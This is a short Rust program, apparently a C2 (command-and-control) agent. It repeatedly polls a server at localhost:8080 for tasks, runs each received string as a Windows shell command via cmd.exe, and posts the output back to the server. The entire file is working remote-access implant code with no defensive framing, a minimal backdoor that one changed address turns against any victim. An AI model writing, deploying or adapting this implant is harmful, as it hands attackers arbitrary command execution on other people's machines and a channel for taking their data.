
    use std::process::Command;
    use std::thread::sleep;
    use std::time::Duration;
    use std::io;
    

    

    fn main() -> io::Result<()> {
        let server = "localhost";
        let port = 8080;
        let base_url = "http://localhost:8080";
    
    
    
    
    
    

        loop {
        // Poll the C2 server for tasks
            let task_url = format!("{}/tasks", base_url);
            let resp = match ureq::get(&task_url).call() {
                Ok(response) => response,
                Err(_e) => {
                // Network error (server may be down); wait and retry
    sleep(Duration::from_secs(5));
                    continue;
                }
            };
        
            let task = resp.into_string().unwrap_or_default();
            if task.is_empty() {
            // No task available; wait and poll again
    sleep(Duration::from_secs(5));
                continue;
            }
        
        // Execute the received task/command
            match Command::new("cmd.exe").args(&["/C", &task]).output() {
                Ok(output) => {
                // Capture and combine stdout and stderr
                    let stdout = String::from_utf8_lossy(&output.stdout);
                    let stderr = String::from_utf8_lossy(&output.stderr);
                    let result = format!("{}{}", stdout, stderr);
                
                // Send the output back to the C2 server
                    let result_url = format!("{}/results", base_url);
                    let _ = ureq::post(&result_url).send_string(&result);
                },
                Err(e) => {
                // Command execution failed; send error back
                    let result_url = format!("{}/results", base_url);
                    let _ = ureq::post(&result_url)
                        .send_string(&format!("Failed to execute task: {}", e));
                }
         }
        
        // Short delay before next poll cycle
    sleep(Duration::from_secs(5));
        }
    }
    